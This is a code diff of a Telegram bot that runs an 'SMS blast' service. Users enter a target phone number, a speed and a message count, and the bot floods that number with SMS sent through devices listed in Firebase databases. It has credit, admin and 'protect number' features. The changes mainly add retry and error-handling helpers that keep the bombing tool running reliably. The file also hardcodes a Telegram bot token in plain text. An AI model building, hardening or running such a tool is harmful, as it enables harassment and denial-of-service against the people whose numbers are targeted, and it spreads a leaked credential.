@@ -4,6 +4,7 @@ from copy import deepcopy
 from collections import defaultdict
 
 import aiohttp
+from aiohttp import web
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.types import (
     Message, CallbackQuery,
@@ -16,7 +17,7 @@ from aiogram.filters import Command, CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
-from aiogram.exceptions import TelegramBadRequest
+from aiogram.exceptions import TelegramBadRequest, TelegramNetworkError
 
 logging.basicConfig(
     level=logging.INFO,
@@ -93,7 +94,7 @@ BOT_TOKEN = "8384076414:AAGlt00e99ncJNiKTLhVBlkq2J6GgyWSo74"
 LOG_CHANNEL_ID = -1002685278453
 
 _DATA_FILE = "blast_data.json"
-_VERSION = "v3.2-PREMIUM"
+_VERSION = "v3.3-PREMIUM"
 _PROGRESS_UPDATE_INTERVAL = 1.0
 _SEND_DELAY = 0.3
 _BACKGROUND_SCAN_INTERVAL = 60.0
@@ -102,6 +103,55 @@ SPEED_FAST = 0.05
 SPEED_MEDIUM = 0.2
 SPEED_SLOW = 0.5
 SPEED_DEFAULT = SPEED_MEDIUM
+
+# ========== SAFE EDIT HELPER (Fix for ServerDisconnectedError) ==========
+async def safe_edit(message, text: str, reply_markup=None, parse_mode="HTML") -> bool:
+    """Safely edit message with retry on network errors."""
+    for attempt in range(3):
+        try:
+            await message.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
+            return True
+        except TelegramBadRequest as e:
+            # "message is not modified" — ignore
+            if "not modified" in str(e).lower():
+                return True
+            log.warning(f"safe_edit TelegramBadRequest: {e}")
+            return False
+        except TelegramNetworkError as e:
+            log.warning(f"safe_edit network error (attempt {attempt+1}): {e}")
+            await asyncio.sleep(1.5 * (attempt + 1))
+        except Exception as e:
+            log.warning(f"safe_edit unexpected error: {e}")
+            return False
+    return False
+
+async def safe_answer(cq: CallbackQuery, text: str = None, show_alert: bool = False) -> bool:
+    """Safely answer callback query with retry."""
+    for attempt in range(3):
+        try:
+            await cq.answer(text, show_alert=show_alert)
+            return True
+        except TelegramNetworkError as e:
+            log.warning(f"safe_answer network error (attempt {attempt+1}): {e}")
+            await asyncio.sleep(1.0 * (attempt + 1))
+        except Exception as e:
+            log.warning(f"safe_answer error: {e}")
+            return False
+    return False
+
+async def safe_send(bot: Bot, chat_id: int, text: str, **kwargs) -> bool:
+    """Safely send message with retry."""
+    for attempt in range(3):
+        try:
+            await bot.send_message(chat_id, text, **kwargs)
+            return True
+        except TelegramNetworkError as e:
+            log.warning(f"safe_send network error (attempt {attempt+1}): {e}")
+            await asyncio.sleep(1.5 * (attempt + 1))
+        except Exception as e:
+            log.warning(f"safe_send error: {e}")
+            return False
+    return False
 
 async def send_fire_effect_private(bot: Bot, chat_id: int):
     try:
@@ -236,8 +286,11 @@ def load() -> dict:
     return d
 
 def save(d: dict):
-    with open(_DATA_FILE, "w", encoding="utf-8") as f:
-        json.dump(d, f, indent=2, ensure_ascii=False)
+    try:
+        with open(_DATA_FILE, "w", encoding="utf-8") as f:
+            json.dump(d, f, indent=2, ensure_ascii=False)
+    except Exception as e:
+        log.error(f"Save error: {e}")
 
 def reg_user(uid: int, name: str, d: dict) -> bool:
     k = str(uid)
@@ -631,7 +684,7 @@ async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
         log.error(f"Force Join check failed for channel {channel_id}: {e}")
         return False
 
-async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
+async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple:
     if is_owner(uid, d):
         return True, []
 
@@ -817,7 +870,6 @@ def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
     rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
-# Fixed: Firebase menu keyboard with pagination to avoid "reply markup too long"
 def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
     fbs = d.get("firebases", [])
     per_page = 8
@@ -883,7 +935,7 @@ def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
     rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
-def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
+def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple:
     users = d.get("users", {})
     items = list(users.items())
     per = 10
@@ -1051,13 +1103,13 @@ async def fj_check(cq: CallbackQuery, state: FSMContext):
     d = load()
     joined, missing = await user_joined_all(cq.bot, uid, d)
     if not joined:
-        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
+        await safe_answer(cq, "❌ Abhi bhi join nahi kiya!", show_alert=True)
         try:
-            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
+            await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing))
         except: pass
         return
 
-    await cq.answer("✅ Verified!", show_alert=True)
+    await safe_answer(cq, "✅ Verified!", show_alert=True)
     await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome! Verified Successfully.\nOwner: {SUPER_ADMIN_NAME}")
 
     if is_owner(uid, d):
@@ -1074,19 +1126,18 @@ async def user_send_start(cq: CallbackQuery, state: FSMContext):
 
     joined, missing = await user_joined_all(cq.bot, uid, d)
     if not joined:
-        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
-        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
+        await safe_answer(cq, "⛔ Force Join compulsory hai!", show_alert=True)
+        await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing))
         return
 
     if not can_use(uid, d):
-        await cq.answer("🚫 Access denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access denied!", show_alert=True)
         return
     await state.set_state(S.send_number)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
         f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "user:home")])
     )
 
 @R.message(S.send_number)
@@ -1152,14 +1203,13 @@ async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
         user_credits = get_user_credits(uid, d)
         credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b> (max {user_credits} bhej sakte hain)\n"
 
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{speed_label} <b>selected!</b>\n\n"
         f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
         f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
         f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
         f"Kitne SMS bhejna hai?",
-        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")])
     )
 
 @R.message(S.send_count)
@@ -1210,15 +1260,14 @@ async def owner_send_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if not is_owner(uid, d):
-        await cq.answer("🚫 Owner only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
         return
     await state.set_state(S.owner_send_number)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
         f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
         f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:home")])
     )
 
 @R.message(S.owner_send_number)
@@ -1267,14 +1316,13 @@ async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
         devices = await get_all_online_devices(load())
     count = len(devices)
 
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{speed_label} <b>selected!</b>\n\n"
         f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
         f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
         f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
         f"Kitne SMS bhejna hai?",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:home")])
     )
 
 @R.message(S.owner_send_count)
@@ -1304,15 +1352,14 @@ async def admin_send_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if not is_admin(uid, d):
-        await cq.answer("🚫 Admin only!", show_alert=True)
+        await safe_answer(cq, "🚫 Admin only!", show_alert=True)
         return
     await state.set_state(S.admin_send_number)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
         f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
         f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "admin:home")])
     )
 
 @R.message(S.admin_send_number)
@@ -1372,14 +1419,13 @@ async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
         devices = await get_all_online_devices(load())
     count = len(devices)
 
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{speed_label} <b>selected!</b>\n\n"
         f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
         f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{count}</b>\n"
         f"{em(EMOJI_CHECK, '📤')} Device Capacity: <b>{count * 3}</b> SMS\n\n"
         f"Kitne SMS bhejna hai?",
-        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "admin:home")])
     )
 
 @R.message(S.admin_send_count)
@@ -1517,6 +1563,8 @@ async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: 
                                 )
                             except TelegramBadRequest:
                                 pass
+                            except TelegramNetworkError:
+                                pass
                             last_update_time = now
 
                     await asyncio.sleep(speed)
@@ -1636,22 +1684,21 @@ async def user_stop_send(cq: CallbackQuery, state: FSMContext):
     async with SESSIONS_LOCK:
         session = USER_SESSIONS.get(uid)
         if not session or (session.task and session.task.done()):
-            await cq.answer("✅ Sending already complete ya koi active sending nahi!", show_alert=True)
+            await safe_answer(cq, "✅ Sending already complete ya koi active sending nahi!", show_alert=True)
             return
         session.cancelled = True
 
-    await cq.answer("🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)
+    await safe_answer(cq, "🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)
 
     try:
         async with session.lock:
             current_sent = session.sent
             current_failed = session.failed
-        await cq.message.edit_text(
+        await safe_edit(cq.message,
             f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n"
             f"{em(EMOJI_CHECK, '✅')} Sent: <b>{current_sent}</b>\n"
             f"{em(EMOJI_CROSS, '❌')} Failed: <b>{current_failed}</b>\n\n"
-            f"<i>Current sending complete hone ke baad ruk jayega...</i>",
-            parse_mode="HTML"
+            f"<i>Current sending complete hone ke baad ruk jayega...</i>"
         )
     except Exception:
         pass
@@ -1660,26 +1707,24 @@ async def user_stop_send(cq: CallbackQuery, state: FSMContext):
 async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     videos = d.get("videos", [])
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal Videos Saved: <b>{len(videos)}</b>",
-        reply_markup=videos_menu_kb(d),
-        parse_mode="HTML"
+        reply_markup=videos_menu_kb(d)
     )
 
 @R.callback_query(F.data == "owner:videos:add")
 async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     await state.set_state(S.add_video)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nTelegram par video bhejiyega ya URL/File ID send karein:",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")])
     )
 
 @R.message(S.add_video)
@@ -1714,7 +1759,7 @@ async def owner_videos_add_done(msg: Message, state: FSMContext):
 async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     idx = int(cq.data.split("owner:videos:del:", 1)[1])
     videos = d.get("videos", [])
@@ -1722,18 +1767,18 @@ async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
         videos.pop(idx)
         d["videos"] = videos
         save(d)
-        await cq.answer("🗑 Video Removed!")
+        await safe_answer(cq, "🗑 Video Removed!")
     await owner_videos_menu(cq, state)
 
 @R.callback_query(F.data == "owner:videos:bulk_del")
 async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        await cq.answer("🚫 Access Denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
         return
     d["videos"] = []
     save(d)
-    await cq.answer("🗑 All Videos Deleted Bulk Mode!", show_alert=True)
+    await safe_answer(cq, "🗑 All Videos Deleted Bulk Mode!", show_alert=True)
     await owner_videos_menu(cq, state)
 
 @R.callback_query(F.data == "user:random_video")
@@ -1741,25 +1786,24 @@ async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
     d = load()
     videos = d.get("videos", [])
     if not videos:
-        await cq.answer("❌ Abhi koi video available nahi hai!", show_alert=True)
+        await safe_answer(cq, "❌ Abhi koi video available nahi hai!", show_alert=True)
         return
-    await cq.answer("📹 Sending video...")
+    await safe_answer(cq, "📹 Sending video...")
     await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy your video!")
 
 @R.callback_query(F.data == "owner:protect")
 async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
         return
     await state.set_state(S.protect_number)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
         f"Jis number ko protect karna hai woh enter karo:\n"
         f"<i>Example: +919876543210</i>\n\n"
         f"Protected number sirf Owner/Super Admin hi use kar sakte hain.",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:home")])
     )
 
 @R.message(S.protect_number)
@@ -1796,17 +1840,16 @@ async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if not is_owner(uid, d) and not is_admin(uid, d):
-        await cq.answer("🚫 Access denied!", show_alert=True)
+        await safe_answer(cq, "🚫 Access denied!", show_alert=True)
         return
 
     protected = d.get("protected_numbers", {})
 
     if not protected:
-        await cq.message.edit_text(
+        await safe_edit(cq.message,
             f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"
             f"{em(EMOJI_CROSS, '❌')} <i>Koi number protected nahi hai.</i>",
-            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
-            parse_mode="HTML"
+            reply_markup=kb([(f"{sc('back')}", "owner:home")])
         )
         return
 
@@ -1832,19 +1875,19 @@ async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
         rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑")])
     rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
 
-    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
+    await safe_edit(cq.message, "\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "owner:protected_remove")
 async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if not is_owner(uid, d) and not is_main_owner(uid):
-        await cq.answer("🚫 Owner only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
         return
 
     protected = d.get("protected_numbers", {})
     if not protected:
-        await cq.answer("❌ Koi protected number nahi hai!", show_alert=True)
+        await safe_answer(cq, "❌ Koi protected number nahi hai!", show_alert=True)
         return
 
     rows = []
@@ -1853,10 +1896,9 @@ async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
 
     rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙")])
 
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected Number</b>\n\nKaunsa number protection hataana hai?",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
-        parse_mode="HTML"
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)
     )
 
 @R.callback_query(F.data.startswith("owner:protected_del:"))
@@ -1864,7 +1906,7 @@ async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if not is_owner(uid, d) and not is_main_owner(uid):
-        await cq.answer("🚫 Owner only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
         return
 
     number = cq.data.split("owner:protected_del:", 1)[1]
@@ -1874,9 +1916,9 @@ async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
         save(d)
         global PROTECTED_NUMBERS
         PROTECTED_NUMBERS = d["protected_numbers"]
-        await cq.answer(f"✅ Protection removed for {number}!", show_alert=True)
+        await safe_answer(cq, f"✅ Protection removed for {number}!", show_alert=True)
     else:
-        await cq.answer("❌ Number not found!", show_alert=True)
+        await safe_answer(cq, "❌ Number not found!", show_alert=True)
 
     await owner_protected_list(cq, state)
 
@@ -1884,16 +1926,15 @@ async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
 async def owner_track_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
         return
     await state.set_state(S.track_number)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n"
         f"Jis number ki tracking karni hai woh enter karo:\n"
         f"<i>Example: +919876543210</i>\n\n"
         f"Is number se SMS bhejne wale users ka pata chalega.",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:home")])
     )
 
 @R.message(S.track_number)
@@ -1947,16 +1988,15 @@ async def owner_track_done(msg: Message, state: FSMContext):
 async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
         return
     await state.set_state(S.add_all_credits_amount)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\n"
         f"Kitne credits sabhi users ko dena hai?\n"
         f"<i>Example: 10</i>\n\n"
         f"{em(EMOJI_WARNING, '⚠️')} <i>Har user ko itne credits milenge. Notification bhi bheja jayega.</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:home")])
     )
 
 @R.message(S.add_all_credits_amount)
@@ -2018,18 +2058,17 @@ async def owner_add_all_credits_done(msg: Message, state: FSMContext):
 async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
         return
     await state.set_state(S.deduct_all_credits_amount)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits from ALL Users</b>\n\n"
         f"Kitne credits sabhi users se katne hain?\n"
         f"<i>Example: 5</i>\n\n"
         f"{em(EMOJI_WARNING, '⚠️')} <i>Har user se itne credits katenge. Negative balance nahi ho sakta.\n"
         f"{em(EMOJI_CROWN, '👑')} Owners/Super Admins se credits nahi katenge.\n"
         f"{em(EMOJI_BELL, '📢')} <b>NOTIFICATION NAHI BHEJI JAYEGI</b></i>",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:home")])
     )
 
 @R.message(S.deduct_all_credits_amount)
@@ -2094,25 +2133,24 @@ async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if is_banned(uid, d):
-        await cq.answer("🚫 You are banned!", show_alert=True)
+        await safe_answer(cq, "🚫 You are banned!", show_alert=True)
         return
     if not can_use(uid, d):
-        await cq.answer("⛔ Access nahi hai!", show_alert=True)
+        await safe_answer(cq, "⛔ Access nahi hai!", show_alert=True)
         return
 
     current_credits = get_user_credits(uid, d)
     if current_credits < 2:
-        await cq.answer("❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
+        await safe_answer(cq, "❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
         return
 
     await state.set_state(S.transfer_credits_uid)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\n"
         f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
         f"{em(EMOJI_WARNING, '⚠️')} Aap apne <b>half credits</b> hi transfer kar sakte hain!\n\n"
         f"{sc('step 1/2')}: Jis user ko credits dena hai uska <b>User ID</b> bhejo:",
-        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "user:home")])
     )
 
 @R.message(S.transfer_credits_uid)
@@ -2210,42 +2248,37 @@ async def owner_home(cq: CallbackQuery, state: FSMContext):
     await state.clear()
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
-    try:
-        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
-    except TelegramBadRequest:
-        pass
+    await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d))
 
 @R.callback_query(F.data.startswith("owner:fb:menu"))
 async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner only!", show_alert=True)
         return
     await state.clear()
     
     parts = cq.data.split(":")
     page = int(parts[3]) if len(parts) > 3 else 0
 
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
-        reply_markup=fb_menu_kb(d, page),
-        parse_mode="HTML"
+        reply_markup=fb_menu_kb(d, page)
     )
 
 @R.callback_query(F.data == "owner:fb:add")
 async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await state.set_state(S.add_firebase)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_FIRE, '🔥')} <b>Add Single Firebase</b>\n\nFirebase URL bhejo:\n"
         f"<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")])
     )
 
 @R.message(S.add_firebase)
@@ -2287,18 +2320,17 @@ async def owner_fb_add_done(msg: Message, state: FSMContext):
 async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     await state.set_state(S.add_firebase_file)
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase via TXT File</b>\n\n"
         f"Aap ek `.txt` file upload karein jisme Firebase URLs hon.\n\n"
         f"<b>Supported File Formats:</b>\n"
         f"• <code>https://myapp.firebaseio.com</code>\n"
         f"• <code>Label | https://myapp.firebaseio.com</code>\n\n"
         f"<i>Duplicate URLs auto-skip ho jayenge!</i>",
-        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
-        parse_mode="HTML"
+        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")])
     )
 
 @R.message(S.add_firebase_file, F.document)
@@ -2379,7 +2411,7 @@ async def owner_fb_add_file_invalid(msg: Message):
 async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     parts = cq.data.split(":")
     fb_id = parts[3]
@@ -2390,12 +2422,11 @@ async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
     global CACHED_DEVICES, FB_DEVICE_COUNTS
     CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
     FB_DEVICE_COUNTS.pop(fb_id, None)
-    await cq.answer("🗑 Removed!")
+    await safe_answer(cq, "🗑 Removed!")
     d = load()
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
-        reply_markup=fb_menu_kb(d, page),
-        parse_mode="HTML"
+        reply_markup=fb_menu_kb(d, page)
     )
 
 @R.callback_query(F.data == "owner:stats")
@@ -2403,9 +2434,9 @@ async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
     await state.clear()
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
-    await cq.answer("⏳ Fetching...")
+    await safe_answer(cq, "⏳ Fetching...")
 
     current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
     global CACHED_DEVICES, FB_DEVICE_COUNTS
@@ -2433,42 +2464,36 @@ async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
     if len(full) > 4000:
         full = full[:3990] + "\n<i>...truncated</i>"
 
-    await cq.message.edit_text(
-        full,
-        reply_markup=kb([
-            (f"{sc('refresh')}", "owner:stats"),
-            (f"{sc('back')}", "owner:home")
-        ]),
-        parse_mode="HTML"
-    )
+    await safe_edit(cq.message, full, reply_markup=kb([
+        (f"{sc('refresh')}", "owner:stats"),
+        (f"{sc('back')}", "owner:home")
+    ]))
 
 @R.callback_query(F.data == "owner:owners:menu")
 async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     owners = d.get("owners", [])
-    await cq.message.edit_text(
+    await safe_edit(cq.message,
         f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(owners)}/6</b>",
-        reply_markup=owners_menu_kb(d),
-        parse_mode="HTML"
+        reply_markup=owners_menu_kb(d)
     )
 
 @R.callback_query(F.data == "owner:owners:add")
 async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        await cq.answer("🚫 Owner Only!", show_alert=True)
+        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
         return
     if len(d.get("owners", [])) >= 6:
